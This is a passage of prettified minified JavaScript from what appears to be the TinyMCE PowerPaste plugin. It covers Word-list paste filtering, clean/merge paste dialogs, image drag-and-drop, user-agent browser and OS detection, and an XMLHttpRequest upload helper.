          "Ignore" === n.getStyle("mso-list") &&
          (t.nextFilter = Vn),
        n.type() === Rt.START_ELEMENT_TYPE && "SPAN" === n.tag())
      )
        t.spanCount.push(n),
          ((t.commentMode && "" === n.getAttribute("style")) ||
            null === n.getAttribute("style")) &&
            (t.nextFilter = Vn)
      else if ("A" === n.tag())
        n.type() === Rt.START_ELEMENT_TYPE
          ? t.spanCount.push(n)
          : t.spanCount.pop()
      else if (n.type() === Rt.TEXT_TYPE)
        if (t.commentMode) (t.nextFilter = Vn), t.nextFilter(e, t, n)
        else {
          var r = t.originalToken,
            o = t.spanCount
          t.emitter.closeAllLists(),
            e.emit(r),
            xt.each(o, xt.bind(e.emit, e)),
            e.emit(n),
            e.commit(),
            (t.originalToken = r),
            (t.nextFilter = qn)
        }
      else (t.commentMode || n.type() !== Rt.COMMENT_TYPE) && Bn(e, n)
    },
    Vn = function (e, t, n) {
      n.type() === Rt.TEXT_TYPE
        ? n.isWhitespace() ||
          ((t.nextFilter = Xn),
          (t.bulletInfo = {
            text: n.text(),
            symbolFont: t.symbolFont,
          }))
        : on(n)
        ? n.type() === Rt.START_ELEMENT_TYPE
          ? t.spanCount.push(n)
          : t.spanCount.pop()
        : n.type() === Rt.START_ELEMENT_TYPE && "IMG" === n.tag()
        ? ((t.nextFilter = Xn),
          (t.bulletInfo = {
            text: "\u2202",
            symbolFont: !0,
          }))
        : Bn(e, n)
    },
    Xn = function (e, t, n) {
      n.type() === Rt.START_ELEMENT_TYPE && on(n)
        ? (t.spanCount.push(n), (t.nextFilter = Gn))
        : n.type() === Rt.END_ELEMENT_TYPE && on(n)
        ? (t.spanCount.pop(), (t.nextFilter = Kn))
        : (n.type() === Rt.END_ELEMENT_TYPE && "IMG" === n.tag()) || Bn(e, n)
    },
    Gn = function (e, t, n) {
      n.type() === Rt.END_ELEMENT_TYPE &&
        (on(n) && t.spanCount.pop(), (t.nextFilter = Kn))
    },
    Kn = function (o, i, a) {
      var e = function (e) {
        var t, n, r
        if (
          ((i.nextFilter = zn),
          i.commentMode &&
            (i.itemLevel = i.indentGuesser.guessIndentLevel(
              a,
              i.originalToken,
              i.styles.styles,
              i.bulletInfo
            )),
          (i.listType = Pn.guessListType(
            i.bulletInfo,
            ((t = i.emitter.getCurrentListType()),
            (n = i.emitter.getCurrentLevel()),
            (r = i.itemLevel),
            n === r ? t : null),
            i.originalToken
          )),
          i.listType)
        ) {
          for (
            i.emitter.openItem(
              i.itemLevel,
              i.originalToken,
              i.listType,
              i.skippedPara
            ),
              o.emitDeferred();
            0 < i.spanCount.length;

          )
            o.emit(i.spanCount.shift())
          e && o.emit(a)
        } else
          xt.log(
            "Unknown list type: " +
              i.bulletInfo.text +
              " Symbol font? " +
              i.bulletInfo.symbolFont
          ),
            o.rollback()
      }
      a.type() === Rt.TEXT_TYPE || a.type() === Rt.START_ELEMENT_TYPE
        ? e(!0)
        : a.type() === Rt.COMMENT_TYPE
        ? e("[endif]" !== a.text())
        : a.type() === Rt.END_ELEMENT_TYPE
        ? on(a) && i.spanCount.pop()
        : Bn(o, a)
    },
    zn = function (e, t, n) {
      n.type() === Rt.END_ELEMENT_TYPE && n.tag() === t.originalToken.tag()
        ? ((t.nextFilter = Yn), (t.skippedPara = !1))
        : e.emit(n)
    },
    Jn = {
      initial: Hn,
    },
    Zn = {},
    Qn = function (e) {
      ;(Zn.nextFilter = Jn.initial),
        (Zn.itemLevel = 0),
        (Zn.originalToken = null),
        (Zn.commentMode = !1),
        (Zn.openedTag = null),
        (Zn.symbolFont = !1),
        (Zn.listType = null),
        (Zn.indentGuesser = Rn()),
        (Zn.emitter = Un(e, e.document)),
        (Zn.styles = Fn()),
        (Zn.spanCount = []),
        (Zn.skippedPara = !1),
        (Zn.styleLevelAdjust = 0),
        (Zn.bulletInfo = void 0)
    }
  Qn({})
  var er = [
      Sn,
      Bt(
        function (e, t) {
          Zn.styles.check(t) ||
            ((Zn.symbolFont = Pn.checkFont(t, Zn.symbolFont)),
            Zn.nextFilter(e, Zn, t))
        },
        function (e) {
          Qn(e)
        }
      ),
      In,
      Ln,
      wn,
      En,
    ],
    tr = function (e, t, n, r) {
      for (
        var o = Ft(n),
          i = jt(e, n),
          a = (function (e, t, n, r) {
            var o,
              i = t
            for (o = e.length - 1; 0 <= o; o--) i = e[o](i, n, r)
            return i
          })(r, o, t, n);
        i.hasNext();

      )
        a.receive(i.next())
      return o.dom
    },
    nr = function (e) {
      return (
        0 <= e.indexOf("<o:p>") ||
        0 <= e.indexOf("p.MsoNormal, li.MsoNormal, div.MsoNormal") ||
        0 <= e.indexOf("MsoListParagraphCxSpFirst") ||
        0 <= e.indexOf("<w:WordDocument>")
      )
    },
    rr = {
      filter: function (e, t, n) {
        var r = Kt.all(e),
          o = nr(r)
        t.setWordContent(o)
        var i = xn
        return o && (i = er.concat(xn)), tr(r, t, n, i)
      },
      filterPlainText: function (e, t, n) {
        var r = Kt.textOnly(e)
        return tr(r, t, n, [$t])
      },
      isWordContent: nr,
    },
    or = {
      officeStyles: "prompt",
      htmlStyles: "clean",
    },
    ir = {
      openDialog: function (e, t, n) {
        var r,
          o = t("cement.dialog.paste.clean"),
          i = t("cement.dialog.paste.merge"),
          a = [
            {
              text: o,
              ariaLabel: o,
              onclick: function () {
                r.close(), n("clean")
              },
            },
            {
              text: i,
              ariaLabel: i,
              onclick: function () {
                r.close(), n("merge")
              },
            },
          ],
          u = {
            title: t("cement.dialog.paste.title"),
            spacing: 10,
            padding: 10,
            items: [
              {
                type: "container",
                html: t("cement.dialog.paste.instructions"),
              },
            ],
            buttons: a,
          }
        ;(r = e.windowManager.open(u)),
          setTimeout(function () {
            r && r.getEl().focus()
          }, 1)
      },
    },
    ar = {
      openDialog: function (e, t, n) {
        var r = t("cement.dialog.paste.clean"),
          o = t("cement.dialog.paste.merge"),
          i = {
            title: t("cement.dialog.paste.title"),
            body: {
              type: "panel",
              items: [
                {
                  type: "htmlpanel",
                  name: "instructions",
                  html: t("cement.dialog.paste.instructions"),
                },
              ],
            },
            buttons: [
              {
                text: r,
                type: "custom",
                name: "clean",
              },
              {
                text: o,
                type: "custom",
                name: "merge",
              },
            ],
            onAction: function (e, t) {
              switch (t.name) {
                case "clean":
                  e.close(), n("clean")
                  break
                case "merge":
                  e.close(), n("merge")
              }
            },
          }
        e.windowManager.open(i)
      },
    }
  function ur(a, u, c) {
    return {
      showDialog: function (o) {
        var e,
          t = a.settings.powerpaste_word_import || or.officeStyles,
          n = a.settings.powerpaste_html_import || or.htmlStyles,
          r = rr.isWordContent(o) ? t : n,
          i = function (e) {
            var t = {
              content: o,
            }
            a.fire("PastePreProcess", {
              content: t,
              internal: !1,
            })
            var n = It.create(e, e, !0),
              r = rr.filter(t.content, n, a.getDoc())
            a.fire("PastePostProcess", {
              node: r,
              internal: !1,
            }),
              a.undoManager.transact(function () {
                Tt.insert(r, a)
              })
          }
        "clean" === (e = r) || "merge" === e
          ? i(r)
          : (c ? ar : ir).openDialog(a, u, i)
      },
    }
  }
  function cr(u, e, t, r, c) {
    var s,
      f = /^image\/(jpe?g|png|gif|bmp)$/i
    u.on("dragstart dragend", function (e) {
      s = "dragstart" === e.type
    }),
      u.on("dragover dragend dragleave", function (e) {
        s || e.preventDefault()
      })
    var l = function (e, t) {
        return t in e && 0 < e[t].length
      },
      d = function (e) {
        var t = e["text/plain"]
        return !!t && 0 === t.indexOf("file://")
      },
      m = function (e) {
        ze(e).get(function (e) {
          var t = B(e, function (e) {
            var t = ht.fromTag("img"),
              n = pe.cata(e, r.getLocalURL, function (e, t, n) {
                return t
              })
            return lt(t, "src", n), t.dom().outerHTML
          }).join("")
          u.insertContent(t, {
            merge: !1 !== u.settings.paste_merge_formats,
          }),
            Q(u) && r.uploadImages(e)
        })
      }
    u.on("drop", function (e) {
      if (!s) {
        if (
          tinymce.dom.RangeUtils &&
          tinymce.dom.RangeUtils.getCaretRangeFromPoint
        ) {
          var t = tinymce.dom.RangeUtils.getCaretRangeFromPoint(
            e.clientX,
            e.clientY,
            u.getDoc()
          )
          t && u.selection.setRng(t)
        }
        var n =
          ((a = (i = e).target.files || i.dataTransfer.files),
          H(a, function (e) {
            return f.test(e.type)
          }))
        if (0 < n.length) return m(n), void e.preventDefault()
        var r = (function (e) {
          var t = {}
          if (e) {
            if (e.getData) {
              var n = e.getData("Text")
              n && 0 < n.length && (t["text/plain"] = n)
            }
            if (e.types)
              for (var r = 0; r < e.types.length; r++) {
                var o = e.types[r]
                t[o] = e.getData(o)
              }
          }
          return t
        })(e.dataTransfer)
        d((o = r)) ||
          (!l(o, "text/html") && !l(o, "text/plain")) ||
          (ur(u, bt.translate, c).showDialog(r["text/html"] || r["text/plain"]),
          e.preventDefault())
      }
      var o, i, a
    })
  }
  var sr = function () {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e]
      return function () {
        for (var n = [], e = 0; e < arguments.length; e++) n[e] = arguments[e]
        if (t.length !== n.length)
          throw new Error(
            'Wrong number of arguments to struct. Expected "[' +
              t.length +
              ']", got ' +
              n.length +
              " arguments"
          )
        var r = {}
        return (
          Y(t, function (e, t) {
            r[e] = y(n[t])
          }),
          r
        )
      }
    },
    fr = function (e) {
      return e.slice(0).sort()
    },
    lr = function (t, e) {
      if (!D(e))
        throw new Error(
          "The " + t + " fields must be an array. Was: " + e + "."
        )
      Y(e, function (e) {
        if (!C(e))
          throw new Error(
            "The value " + e + " in the " + t + " fields was not a string."
          )
      })
    },
    dr = function (o, i) {
      var n,
        a = o.concat(i)
      if (0 === a.length)
        throw new Error(
          "You must specify at least one required or optional field."
        )
      return (
        lr("required", o),
        lr("optional", i),
        (n = fr(a)),
        $(n, function (e, t) {
          return t < n.length - 1 && e === n[t + 1]
        }).each(function (e) {
          throw new Error(
            "The field: " +
              e +
              " occurs more than once in the combined fields: [" +
              n.join(", ") +
              "]."
          )
        }),
        function (t) {
          var n = ie(t)
          K(o, function (e) {
            return j(n, e)
          }) ||
            (function (e, t) {
              throw new Error(
                "All required keys (" +
                  fr(e).join(", ") +
                  ") were not specified. Specified keys were: " +
                  fr(t).join(", ") +
                  "."
              )
            })(o, n)
          var e = H(n, function (e) {
            return !j(a, e)
          })
          0 < e.length &&
            (function (e) {
              throw new Error(
                "Unsupported keys for object: " + fr(e).join(", ")
              )
            })(e)
          var r = {}
          return (
            Y(o, function (e) {
              r[e] = y(t[e])
            }),
            Y(i, function (e) {
              r[e] = y(
                Object.prototype.hasOwnProperty.call(t, e)
                  ? N.some(t[e])
                  : N.none()
              )
            }),
            r
          )
        }
      )
    },
    mr = sr("id", "imageresult", "objurl")
  function pr() {
    var o = {},
      n = function (e) {
        g.URL.revokeObjectURL(e.objurl())
      }
    return {
      add: function (e, t, n) {
        var r = mr(e, t, n)
        return (o[e] = r)
      },
      get: function (e) {
        return N.from(o[e])
      },
      remove: function (e) {
        var t = o[e]
        delete o[e], void 0 !== t && n(t)
      },
      lookupByData: function (t) {
        return (function (e, t) {
          for (var n = ie(e), r = 0, o = n.length; r < o; r++) {
            var i = n[r],
              a = e[i]
            if (t(a, i, e)) return N.some(a)
          }
          return N.none()
        })(o, function (e) {
          return Xe(e.imageresult()) === t
        })
      },
      destroy: function () {
        ae(o, n), (o = {})
      },
    }
  }
  var gr,
    vr,
    hr = function (e) {
      var r = sr.apply(null, e),
        o = []
      return {
        bind: function (e) {
          if (void 0 === e)
            throw new Error("Event bind error: undefined handler")
          o.push(e)
        },
        unbind: function (t) {
          o = H(o, function (e) {
            return e !== t
          })
        },
        trigger: function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
          var n = r.apply(null, e)
          Y(o, function (e) {
            e(n)
          })
        },
      }
    },
    yr = {
      create: function (e) {
        return {
          registry: ue(e, function (e) {
            return {
              bind: e.bind,
              unbind: e.unbind,
            }
          }),
          trigger: ue(e, function (e) {
            return e.trigger
          }),
        }
      },
    },
    br = function (e) {
      return e.replace(/\./g, "-")
    },
    Tr = function (e, t) {
      return e + "-" + t
    },
    xr = function (e) {
      var n = br(e)
      return {
        resolve: function (e) {
          var t = e.split(" ")
          return B(t, function (e) {
            return Tr(n, e)
          }).join(" ")
        },
      }
    },
    Er = {
      resolve: xr("ephox-salmon").resolve,
    },
    wr = Er.resolve("upload-image-in-progress"),
    Sr = "data-" + Er.resolve("image-blob"),
    Ir = "data-" + Er.resolve("image-upload"),
    Lr = {
      uploadInProgress: y(wr),
      blobId: y(Sr),
      trackedImage: y(Ir),
    },
    Nr = function (n) {
      var r,
        o = !1
      return function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
        return o || ((o = !0), (r = n.apply(null, e))), r
      }
    },
    _r = function (e) {
      var t = st(e) ? e.dom().parentNode : e.dom()
      return null != t && t.ownerDocument.body.contains(t)
    },
    Cr = function (e, t) {
      for (
        var n = [],
          r = function (e) {
            return n.push(e), t(e)
          },
          o = t(e);
        (o = o.bind(r)).isSome();

      );
      return n
    },
    Or = function (e, t, n) {
      return 0 != (e.compareDocumentPosition(t) & n)
    },
    Dr = function (e, t) {
      return Or(e, t, g.Node.DOCUMENT_POSITION_CONTAINED_BY)
    },
    Pr = function (e) {
      var t = e,
        n = function () {
          return t
        }
      return {
        get: n,
        set: function (e) {
          t = e
        },
        clone: function () {
          return Pr(n())
        },
      }
    },
    Ar = function () {
      return kr(0, 0)
    },
    kr = function (e, t) {
      return {
        major: e,
        minor: t,
      }
    },
    Mr = {
      nu: kr,
      detect: function (e, t) {
        var n = String(t).toLowerCase()
        return 0 === e.length
          ? Ar()
          : (function (e, t) {
              var n = (function (e, t) {
                for (var n = 0; n < e.length; n++) {
                  var r = e[n]
                  if (r.test(t)) return r
                }
              })(e, t)
              if (!n)
                return {
                  major: 0,
                  minor: 0,
                }
              var r = function (e) {
                return Number(t.replace(n, "$" + e))
              }
              return kr(r(1), r(2))
            })(e, n)
      },
      unknown: Ar,
    },
    Rr = "Firefox",
    Fr = function (e, t) {
      return function () {
        return t === e
      }
    },
    jr = function (e) {
      var t = e.current
      return {
        current: t,
        version: e.version,
        isEdge: Fr("Edge", t),
        isChrome: Fr("Chrome", t),
        isIE: Fr("IE", t),
        isOpera: Fr("Opera", t),
        isFirefox: Fr(Rr, t),
        isSafari: Fr("Safari", t),
      }
    },
    Ur = {
      unknown: function () {
        return jr({
          current: void 0,
          version: Mr.unknown(),
        })
      },
      nu: jr,
      edge: y("Edge"),
      chrome: y("Chrome"),
      ie: y("IE"),
      opera: y("Opera"),
      firefox: y(Rr),
      safari: y("Safari"),
    },
    Br = "Windows",
    Yr = "Android",
    Wr = "Solaris",
    Hr = "FreeBSD",
    qr = "ChromeOS",
    $r = function (e, t) {
      return function () {
        return t === e
      }
    },
    Vr = function (e) {
      var t = e.current
      return {
        current: t,
        version: e.version,
        isWindows: $r(Br, t),
        isiOS: $r("iOS", t),
        isAndroid: $r(Yr, t),
        isOSX: $r("OSX", t),
        isLinux: $r("Linux", t),
        isSolaris: $r(Wr, t),
        isFreeBSD: $r(Hr, t),
        isChromeOS: $r(qr, t),
      }
    },
    Xr = {
      unknown: function () {
        return Vr({
          current: void 0,
          version: Mr.unknown(),
        })
      },
      nu: Vr,
      windows: y(Br),
      ios: y("iOS"),
      android: y(Yr),
      linux: y("Linux"),
      osx: y("OSX"),
      solaris: y(Wr),
      freebsd: y(Hr),
      chromeos: y(qr),
    },
    Gr = function (e, t) {
      var n = String(t).toLowerCase()
      return $(e, function (e) {
        return e.search(n)
      })
    },
    Kr = function (e, n) {
      return Gr(e, n).map(function (e) {
        var t = Mr.detect(e.versionRegexes, n)
        return {
          current: e.name,
          version: t,
        }
      })
    },
    zr = function (e, n) {
      return Gr(e, n).map(function (e) {
        var t = Mr.detect(e.versionRegexes, n)
        return {
          current: e.name,
          version: t,
        }
      })
    },
    Jr = function (e, t, n) {
      return (
        "" === t || (!(e.length < t.length) && e.substr(n, n + t.length) === t)
      )
    },
    Zr = function (e, t) {
      return to(e, t) ? ((n = e), (r = t.length), n.substring(r)) : e
      var n, r
    },
    Qr = function (e, t) {
      return no(e, t)
        ? ((n = e), (r = t.length), n.substring(0, n.length - r))
        : e
      var n, r
    },
    eo = function (e, t) {
      return -1 !== e.indexOf(t)
    },
    to = function (e, t) {
      return Jr(e, t, 0)
    },
    no = function (e, t) {
      return Jr(e, t, e.length - t.length)
    },
    ro = function (e) {
      return e.replace(/^\s+|\s+$/g, "")
    },
    oo = /.*?version\/\ ?([0-9]+)\.([0-9]+).*/,
    io = function (t) {
      return function (e) {
        return eo(e, t)
      }
    },
    ao = [
      {
        name: "Edge",
        versionRegexes: [/.*?edge\/ ?([0-9]+)\.([0-9]+)$/],
        search: function (e) {
          return (
            eo(e, "edge/") &&
            eo(e, "chrome") &&
            eo(e, "safari") &&
            eo(e, "applewebkit")
          )
        },
      },
      {
        name: "Chrome",
        versionRegexes: [/.*?chrome\/([0-9]+)\.([0-9]+).*/, oo],
        search: function (e) {
          return eo(e, "chrome") && !eo(e, "chromeframe")
        },
      },
      {
        name: "IE",
        versionRegexes: [
          /.*?msie\ ?([0-9]+)\.([0-9]+).*/,
          /.*?rv:([0-9]+)\.([0-9]+).*/,
        ],
        search: function (e) {
          return eo(e, "msie") || eo(e, "trident")
        },
      },
      {
        name: "Opera",
        versionRegexes: [oo, /.*?opera\/([0-9]+)\.([0-9]+).*/],
        search: io("opera"),
      },
      {
        name: "Firefox",
        versionRegexes: [/.*?firefox\/\ ?([0-9]+)\.([0-9]+).*/],
        search: io("firefox"),
      },
      {
        name: "Safari",
        versionRegexes: [oo, /.*?cpu os ([0-9]+)_([0-9]+).*/],
        search: function (e) {
          return (eo(e, "safari") || eo(e, "mobile/")) && eo(e, "applewebkit")
        },
      },
    ],
    uo = [
      {
        name: "Windows",
        search: io("win"),
        versionRegexes: [/.*?windows\ nt\ ?([0-9]+)\.([0-9]+).*/],
      },
      {
        name: "iOS",
        search: function (e) {
          return eo(e, "iphone") || eo(e, "ipad")
        },
        versionRegexes: [
          /.*?version\/\ ?([0-9]+)\.([0-9]+).*/,
          /.*cpu os ([0-9]+)_([0-9]+).*/,
          /.*cpu iphone os ([0-9]+)_([0-9]+).*/,
        ],
      },
      {
        name: "Android",
        search: io("android"),
        versionRegexes: [/.*?android\ ?([0-9]+)\.([0-9]+).*/],
      },
      {
        name: "OSX",
        search: io("mac os x"),
        versionRegexes: [/.*?mac\ os\ x\ ?([0-9]+)_([0-9]+).*/],
      },
      {
        name: "Linux",
        search: io("linux"),
        versionRegexes: [],
      },
      {
        name: "Solaris",
        search: io("sunos"),
        versionRegexes: [],
      },
      {
        name: "FreeBSD",
        search: io("freebsd"),
        versionRegexes: [],
      },
      {
        name: "ChromeOS",
        search: io("cros"),
        versionRegexes: [/.*?chrome\/([0-9]+)\.([0-9]+).*/],
      },
    ],
    co = {
      browsers: y(ao),
      oses: y(uo),
    },
    so = Pr(
      (function (e, t) {
        var n,
          r,
          o,
          i,
          a,
          u,
          c,
          s,
          f,
          l,
          d,
          m,
          p = co.browsers(),
          g = co.oses(),
          v = Kr(p, e).fold(Ur.unknown, Ur.nu),
          h = zr(g, e).fold(Xr.unknown, Xr.nu)
        return {
          browser: v,
          os: h,
          deviceType:
            ((r = v),
            (o = e),
            (i = t),
            (a = (n = h).isiOS() && !0 === /ipad/i.test(o)),
            (u = n.isiOS() && !a),
            (c = n.isiOS() || n.isAndroid()),
            (s = c || i("(pointer:coarse)")),
            (f = a || (!u && c && i("(min-device-width:768px)"))),
            (l = u || (c && !f)),
            (d = r.isSafari() && n.isiOS() && !1 === /safari/i.test(o)),
            (m = !l && !f && !d),
            {
              isiPad: y(a),
              isiPhone: y(u),
              isTablet: y(f),
              isPhone: y(l),
              isTouch: y(s),
              isAndroid: n.isAndroid,
              isiOS: n.isiOS,
              isWebView: y(d),
              isDesktop: y(m),
            }),
        }
      })(g.navigator.userAgent, function (e) {
        return g.window.matchMedia(e).matches
      })
    ),
    fo = function () {
      return so.get()
    },
    lo = Qe,
    mo = Ze,
    po = function (e, t) {
      var n = e.dom()
      if (n.nodeType !== lo) return !1
      var r = n
      if (void 0 !== r.matches) return r.matches(t)
      if (void 0 !== r.msMatchesSelector) return r.msMatchesSelector(t)
      if (void 0 !== r.webkitMatchesSelector) return r.webkitMatchesSelector(t)
      if (void 0 !== r.mozMatchesSelector) return r.mozMatchesSelector(t)
      throw new Error("Browser lacks native selectors")
    },
    go = function (e) {
      return (
        (e.nodeType !== lo && e.nodeType !== mo) || 0 === e.childElementCount
      )
    },
    vo = function (e, t) {
      var n = void 0 === t ? g.document : t.dom()
      return go(n) ? [] : B(n.querySelectorAll(e), ht.fromDom)
    },
    ho = function (e, t) {
      return e.dom() === t.dom()
    },
    yo = (fo().browser.isIE(), po),
    bo = function (e) {
      return ht.fromDom(e.dom().ownerDocument)
    },
    To = function (e) {
      return N.from(e.dom().parentNode).map(ht.fromDom)
    },
    xo = function (e, t) {
      for (
        var n = A(t) ? t : x, r = e.dom(), o = [];
        null !== r.parentNode && void 0 !== r.parentNode;

      ) {
        var i = r.parentNode,
          a = ht.fromDom(i)
        if ((o.push(a), !0 === n(a))) break
        r = i
      }
      return o
    },
    Eo = function (e) {
      return N.from(e.dom().previousSibling).map(ht.fromDom)
    },
    wo = function (e) {
      return N.from(e.dom().nextSibling).map(ht.fromDom)
    },
    So = function (e) {
      return (t = Cr(e, Eo)), (n = M.call(t, 0)).reverse(), n
      var t, n
    },
    Io = function (e) {
      return B(e.dom().childNodes, ht.fromDom)
    },
    Lo = function (e) {
      return (t = 0), (n = e.dom().childNodes), N.from(n[t]).map(ht.fromDom)
      var t, n
    },
    No = function (e) {
      return e.dom().childNodes.length
    },
    _o =
      (sr("element", "offset"),
      function (e, t) {
        var n = []
        return (
          Y(Io(e), function (e) {
            t(e) && (n = n.concat([e])), (n = n.concat(_o(e, t)))
          }),
          n
        )
      }),
    Co = function (e, t) {
      return vo(t, e)
    },
    Oo = Lr.trackedImage(),
    Do = function (e, t) {
      return Co(e, "img[" + Oo + '="' + t + '"]')
    },
    Po = function (e) {
      return Co(e, "img:not([" + Oo + "])[" + Lr.blobId() + "]")
    }
  function Ao() {
    var o = [],
      i = [],
      e = yr.create({
        complete: hr(["response"]),
      }),
      a = function () {
        e.trigger.complete(i), (i = [])
      },
      u = function () {
        return 0 < o.length
      }
    return {
      findById: Do,
      findAll: Po,
      register: function (e, t) {
        lt(e, Oo, t), o.push(t)
      },
      report: function (e, t, r) {
        var n
        Y(t, function (e) {
          var t, n
          gt(e, Oo),
            (t = r),
            (n = e),
            i.push({
              success: t,
              element: n.dom(),
            })
        }),
          (n = e),
          (o = H(o, function (e, t) {
            return e !== n
          })),
          !1 === u() && a()
      },
      inProgress: u,
      isActive: function (e) {
        return j(o, e)
      },
      events: e.registry,
    }
  }
  ;((vr = gr || (gr = {})).JSON = "json"),
    (vr.Blob = "blob"),
    (vr.Text = "text"),
    (vr.FormData = "formdata"),
    (vr.MultipartFormData = "multipart/form-data")
  var ko,
    Mo = function (n) {
      return {
        is: function (e) {
          return n === e
        },
        isValue: E,
        isError: x,
        getOr: y(n),
        getOrThunk: y(n),
        getOrDie: y(n),
        or: function (e) {
          return Mo(n)
        },
        orThunk: function (e) {
          return Mo(n)
        },
        fold: function (e, t) {
          return t(n)
        },
        map: function (e) {
          return Mo(e(n))
        },
        mapError: function (e) {
          return Mo(n)
        },
        each: function (e) {
          e(n)
        },
        bind: function (e) {
          return e(n)
        },
        exists: function (e) {
          return e(n)
        },
        forall: function (e) {
          return e(n)
        },
        toOption: function () {
          return N.some(n)
        },
      }
    },
    Ro = function (n) {
      return {
        is: x,
        isValue: x,
        isError: E,
        getOr: a,
        getOrThunk: function (e) {
          return e()
        },
        getOrDie: function () {
          return T(String(n))()
        },
        or: function (e) {
          return e
        },
        orThunk: function (e) {
          return e()
        },
        fold: function (e, t) {
          return e(n)
        },
        map: function (e) {
          return Ro(n)
        },
        mapError: function (e) {
          return Ro(e(n))
        },
        each: L,
        bind: function (e) {
          return Ro(n)
        },
        exists: x,
        forall: E,
        toOption: N.none,
      }
    },
    Fo = {
      value: Mo,
      error: Ro,
      fromOption: function (e, t) {
        return e.fold(function () {
          return Ro(t)
        }, Mo)
      },
    },
    jo = function (i) {
      return oe(oe({}, i), {
        toCached: function () {
          return jo(i.toCached())
        },
        bindFuture: function (t) {
          return jo(
            i.bind(function (e) {
              return e.fold(
                function (e) {
                  return Ee.pure(Fo.error(e))
                },
                function (e) {
                  return t(e)
                }
              )
            })
          )
        },
        bindResult: function (t) {
          return jo(
            i.map(function (e) {
              return e.bind(t)
            })
          )
        },
        mapResult: function (t) {
          return jo(
            i.map(function (e) {
              return e.map(t)
            })
          )
        },
        mapError: function (t) {
          return jo(
            i.map(function (e) {
              return e.mapError(t)
            })
          )
        },
        foldResult: function (t, n) {
          return i.map(function (e) {
            return e.fold(t, n)
          })
        },
        withTimeout: function (e, o) {
          return jo(
            Ee.nu(function (t) {
              var n = !1,
                r = g.setTimeout(function () {
                  ;(n = !0), t(Fo.error(o()))
                }, e)
              i.get(function (e) {
                n || (g.clearTimeout(r), t(e))
              })
            })
          )
        },
      })
    },
    Uo = function (e) {
      return jo(Ee.nu(e))
    },
    Bo = function (e) {
      return jo(Ee.pure(Fo.value(e)))
    },
    Yo = Uo,
    Wo = Bo,
    Ho = function (e) {
      return jo(Ee.pure(Fo.error(e)))
    },
    qo = function (e) {
      try {
        var t = JSON.parse(e)
        return Fo.value(t)
      } catch (e) {
        return Fo.error("Response was not JSON.")
      }
    },
    $o = function (t) {
      return Ee.nu(function (n) {
        var e = new g.FileReader()
        ;(e.onload = function (e) {
          var t = e.target ? e.target.result : new g.Blob([])
          n(t)
        }),
          e.readAsText(t)
      })
    },
    Vo = function (e) {
      return Ee.pure(e.response)
    },
    Xo = function (e, t) {
      switch (e) {
        case gr.JSON:
          return qo(t.response).fold(function () {
            return Vo(t)
          }, Ee.pure)
        case gr.Blob:
          return (
            (n = t),
            N.from(n.response).map($o).getOr(Ee.pure("no response content"))
          )
        case gr.Text:
        default:
          return Vo(t)
      }
      var n
    },
    Go = function (e) {
      var t,
        n =
          ((t = e.body),
          N.from(t).bind(function (e) {
            switch (e.type) {
              case gr.JSON:
                return N.some("application/json")
              case gr.FormData:
                return N.some(
                  "application/x-www-form-urlencoded; charset=UTF-8"
                )
              case gr.MultipartFormData:
                return N.none()
              case gr.Text:
              default:
                return N.some("text/plain")
            }
          })),
        r = !0 === e.credentials ? N.some(!0) : N.none(),
        o =
          (function (e) {
            switch (e) {
              case gr.Blob:
                return "application/octet-stream"
              case gr.JSON:
                return "application/json, text/javascript"
              case gr.Text:
                return "text/plain"
              default:
                return ""
            }
          })(e.responseType) + ", */*; q=0.01",
        i = void 0 !== e.headers ? e.headers : {}
      return {
        contentType: n,
        responseType: (function (e) {
          switch (e) {
            case gr.JSON:
              return N.none()
            case gr.Blob:
              return N.some("blob")
            case gr.Text:
              return N.some("text")
            default:
              return N.none()
          }
        })(e.responseType),
        credentials: r,
        accept: o,
        headers: i,
        progress: A(e.progress) ? N.some(e.progress) : N.none(),
      }
    },
    Ko = function (e) {
      var n = new g.FormData()
      return (
        ae(e, function (e, t) {
          n.append(t, e)
        }),
        n
      )
    },
    zo = function (c) {
      return Yo(function (r) {
        var o,
          i = new g.XMLHttpRequest()
        i.open(
          c.method,
          ((o = c.url),
          N.from(c.query)
            .map(function (e) {
              var t = se(e, function (e, t) {
                  return encodeURIComponent(t) + "=" + encodeURIComponent(e)
                }),
                n = eo(o, "?") ? "&" : "?"
              return 0 < t.length ? o + n + t.join("&") : o
            })
            .getOr(o)),
          !0
        )
        var n,
          e,
          t = Go(c)
        ;(n = i),
          (e = t).contentType.each(function (e) {
            return n.setRequestHeader("Content-Type", e)
          }),
          n.setRequestHeader("Accept", e.accept),
          e.credentials.each(function (e) {
            return (n.withCredentials = e)
          }),
          e.responseType.each(function (e) {
            return (n.responseType = e)
          }),
          e.progress.each(function (t) {
            return n.upload.addEventListener("progress", function (e) {
              return t(e.loaded, e.total)
            })
          }),
          ae(e.headers, function (e, t) {
            return n.setRequestHeader(t, e)
          })
        var a,
          u = function () {
            var t, e, n
            ;((t = c.url),
            (e = c.responseType),
            (n = i),
            Xo(e, n).map(function (e) {
              return {
                message:
                  0 === n.status
                    ? "Unknown HTTP error (possible cross-domain request)"
                    : "Could not load url " + t + ": " + n.statusText,
                status: n.status,
                responseText: e,
              }
            })).get(function (e) {
              return r(Fo.error(e))
            })
          }
        ;(i.onerror = u),
          (i.onload = function () {
            0 !== i.status || to(c.url, "file:")
              ? i.status < 100 || 400 <= i.status
                ? u()
                : (function (e, t) {
                    var n = function () {
                        return Wo(t.response)
                      },
                      r = function (e) {
                        return Ho({
                          message: e,
                          status: t.status,
                          responseText: t.responseText,
                        })
                      }
                    switch (e) {
                      case gr.JSON:
                        return qo(t.response).fold(r, Wo)
                      case gr.Blob:
                      case gr.Text:
                        return n()
                      default:
                        return r("unknown data type")
                    }
                  })(c.responseType, i).get(r)
              : u()
          }),
          ((a = c.body),
          N.from(a).map(function (e) {
            return e.type === gr.JSON
              ? JSON.stringify(e.data)
              : e.type === gr.FormData
              ? Ko(e.data)
              : e.type === gr.MultipartFormData
              ? Ko(e.data)
              : e
          })).fold(
            function () {
              return i.send()
            },
            function (e) {
              i.send(e)
            }
          )
      })
    },
    Jo = sr("message", "status", "contents"),
    Zo = ["jpg", "png", "gif", "jpeg"],
    Qo = {
      failureObject: Jo,
      getFilename: function (e, t) {
        return C(e.name) && !no(e.name, ".tmp")
          ? e.name
          : (function (e, t) {
              if (C(e.type) && to(e.type, "image/")) {
                var n = e.type.substr("image/".length)
